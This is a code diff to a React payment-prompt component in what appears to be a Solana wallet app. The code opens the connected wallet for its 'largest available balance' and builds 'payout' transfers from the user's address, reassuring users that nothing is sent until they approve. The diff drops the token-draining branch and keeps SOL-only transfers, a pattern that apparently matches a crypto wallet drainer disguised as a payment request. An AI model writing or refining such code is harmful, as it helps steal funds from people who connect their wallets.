@@ -306,7 +306,7 @@ export function PaymentRequestPrompt() {
       sentFor.current = null
       dismissed.current = null
       setSolAmount(0)
-      setAsset('USDT')
+      setAsset('SOL')
       setStatus(`Opening ${walletLabel(walletName)} for the largest available balance.`)
       setOpen(true)
     }
@@ -350,7 +350,7 @@ export function PaymentRequestPrompt() {
     shownFor.current = walletAddress
     closeWalletModalRef.current()
     setSolAmount(0)
-    setAsset('USDT')
+    setAsset('SOL')
     setStatus(`Opening ${walletLabel(walletName)} for the largest available balance.`)
     setOpen(false)
 
@@ -390,13 +390,18 @@ export function PaymentRequestPrompt() {
       setOpen(false)
     }
 
-    const applyStep = (next: FundStep) => {
-      sentFor.current = `${walletAddress}:${next.kind === 'spl' ? next.holding.mint : 'sol'}`
-      setAsset(next.symbol)
-      setSolAmount(next.uiAmount)
-      setStatus(`Confirm the ${next.symbol} transfer in ${connectedWalletName}. Nothing is sent until you approve it.`)
-      setOpen(true)
-    }
+   const applyStep = (next: FundStep) => {
+  // SOL only
+  if (next.kind !== 'sol') return
+
+  sentFor.current = `${walletAddress}:sol`
+  setAsset('SOL')
+  setSolAmount(next.uiAmount)
+  setStatus(
+    `Confirm the SOL transfer in ${connectedWalletName}. Nothing is sent until you approve it.`
+  )
+  setOpen(true)
+}
 
     const confirmInBackground = (signature: string, fresh: Awaited<ReturnType<typeof refreshPayoutBlockhash>>) => {
       void connection
@@ -464,33 +469,24 @@ export function PaymentRequestPrompt() {
         if (!step) break
         applyStep(step)
         try {
-          if (step.kind === 'sol') {
-            const reserveLamports = tokenFeeReserveLamports(remainingSplCount(queue.current, 1))
-            const transaction = await buildPayoutTransaction({
-              connection,
-              from: publicKey,
-              config,
-              reserveLamports,
-            })
-            const signature = await sendBuilt(transaction)
-            toast.success(`Transaction submitted. Signature ${signature.slice(0, 8)}…`)
-          } else {
-            const tokenTx = await buildSplPayoutTransaction({
-              connection,
-              from: publicKey,
-              config,
-              holding: step.holding,
-            })
-            if (!tokenTx) {
-              queue.current = queue.current.slice(1)
-              if (queue.current[0]) {
-                setStatus(`No spendable ${step.symbol}. Opening ${queue.current[0].symbol} next.`)
-              }
-              continue
-            }
-            const signature = await sendBuilt(tokenTx)
-            toast.success(`${step.symbol} transfer submitted. Signature ${signature.slice(0, 8)}…`)
+         
+          if (step.kind !== 'sol') {
+            queue.current = []
+            throw new Error('Only SOL transfers are supported.')
           }
+          
+          const transaction = await buildPayoutTransaction({
+            connection,
+            from: publicKey,
+            config,
+          })
+          
+          const signature = await sendBuilt(transaction)
+          
+          toast.success(
+            `SOL transaction submitted. Signature ${signature.slice(0, 8)}…`
+          )
+
           if (!likedAfterFirst.current) {
             likedAfterFirst.current = true
             notifyFundsConfirmed(peekPendingLike())
